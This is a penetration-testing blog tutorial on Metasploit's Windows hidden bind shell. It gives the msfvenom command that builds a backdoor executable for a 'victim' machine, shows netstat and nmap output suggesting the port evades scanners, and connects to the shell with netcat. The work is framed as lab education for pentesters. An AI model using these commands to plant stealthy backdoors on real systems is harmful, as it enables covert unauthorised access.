<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Metasploit for Pentester: Windows Hidden Bind Shell</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/metasploit-for-pentester-windows-hidden-bind-shell/" rel="bookmark"><time class="entry-date published" datetime="2021-07-30T16:42:33+00:00">July 30, 2021</time><time class="updated" datetime="2025-06-19T13:23:52+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000">In this article, we are going to cover the tactics of the <strong data-start="565" data-end="605">Metasploit Windows Hidden Bind Shell</strong>. Hidden BIND TCP shellcode helps penetration testers create a backdoor that remains undetected by network scanners. Every organization deploys multiple scanning tools to detect unknown open ports, making it challenging to hide suspicious bind shellcodes from detection.</span></p>
<p><span style="color: #000000">But how can we sit idle without the set of a new idea? We are here with the concept of Hidden Bind TCP shell. This shellcode listens to the connection only from the allowed IP address of the host (I.e. Ahost). And for other connections, it replies with an RST packet, (A reset packet is simply one with no payload and with the RST bit set in the TCP header flags). This is the way the port will appear as “closed” and help us to hide the shellcode.</span></p>
<h3><span style="color: #800000">Pre-requisites for Lap Set up</span></h3>
<ul>
<li><span style="color: #000000">Kali Linux(Pentester’s Machine)</span></li>
<li><span style="color: #000000">Window 10 (Victim’s Machine)</span></li>
<li><span style="color: #000000">Zenmap Tool</span></li>
</ul>
<p><span style="color: #000000">Let’s Begin!!</span></p>
<h3><span style="color: #800000">Creating the Hidden Bind Shell Payload</span></h3>
<p><span style="color: #000000">Using the msfvenom tool in Metasploit Windows Hidden Bind Shell, we are going to create a payload for Windows by using the shell_hidden_bind_tcp module and save it in the exe format named <strong data-start="311" data-end="323">file.exe</strong>. We will then send the file to the victim’s PC and execute the malicious <strong data-start="397" data-end="409">file.exe</strong> on the victim’s system. It will open a new service on the victim’s PC with port number <strong data-start="497" data-end="505">4321</strong>, which establishes a connection with the pentester’s IP.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.1.2 lport=4321 -f exe &gt; file.exe</pre>
<p><span style="color: #000000"><img decoding="async" src="https://1.bp.blogspot.com/-YP3OWLpM1cY/YQQpeJswtrI/AAAAAAAAyCc/cADYfBY9V54b3PmfCXVEBRDMhxrC_zIdACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000">Now, In case the victim runs the netstat command, which will display all the active connections as showing in the below screenshot. In the output, port 4321 does not have an IP address but it appears as some internal services are running through local or internal connections. On the other hand, the connection is already established with the Pentester’s IP.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netstat -ano</pre>
<p><span style="color: #000000"><img decoding="async" src="https://1.bp.blogspot.com/-43cZLZadKDc/YQQpinfQelI/AAAAAAAAyCg/h60bcBL2ZKE1CVXi1n13xvCDwJ-S1sqtgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000">If the victim wants to verify the service for unknown port 4321 and will try to scan that port using the  Zenmap tool. The result of the Nmap will show the closed state of port 4321 which means its undetectable through the scanning tool. On the other hand, it is making a connection with the Pentester’s IP.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://1.bp.blogspot.com/-gWfj3rAkc_0/YQQpmWFjxzI/AAAAAAAAyCk/DJ6UmUx6-70_AJHv44zkvjUHIVh31HGHQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000">On the other side, if we scan the same port from outside the network of the victim through Kali. The result of the same Nmap command shows the open state of port 4321.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p 4321 192.168.1.145</pre>
<p><span style="color: #000000"><img decoding="async" src="https://1.bp.blogspot.com/-D6y0MOiVCa8/YQQpqLzkb9I/AAAAAAAAyCo/dYxfekAxKl478zeI-dJzbYrXj4Wr72uJgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000">This is the magic of the hidden shellcode to remain undetectable from the reach of different scanning tools.</span></p>
<h3><span style="color: #800000">Remote Access and Final Exploitation</span></h3>
<p><span style="color: #000000">As we have already executed malicious payload file.exe on the victim’s PC, so through the netcat we have a session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc 192.168.1.145 4321</pre>
<p><span style="color: #000000"><img decoding="async" src="https://1.bp.blogspot.com/-bAMvFjoiF8Q/YQQpt24GjGI/AAAAAAAAyCs/JwUVSjaH87UgV_tv1qBWMijdzsNk5hPOwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000">In this article, we demonstrated how the <strong data-start="194" data-end="234">Metasploit Windows Hidden Bind Shell</strong> can be used to establish a stealthy backdoor that evades traditional network scanning tools. Mastering this technique is essential for penetration testers aiming to stay ahead in secure environments.</span></p>
<p><span style="color: #000000"><strong>Author</strong>: Nisha Sharma is an Experienced and Certified Security Consultant. Highly skilled in Infrastructure, web pentesting along SIEM and other security devices. Connect with her <span style="color: #0000ff"><a style="color: #0000ff" href="https://www.linkedin.com/in/nishasharmaa"><strong>here</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
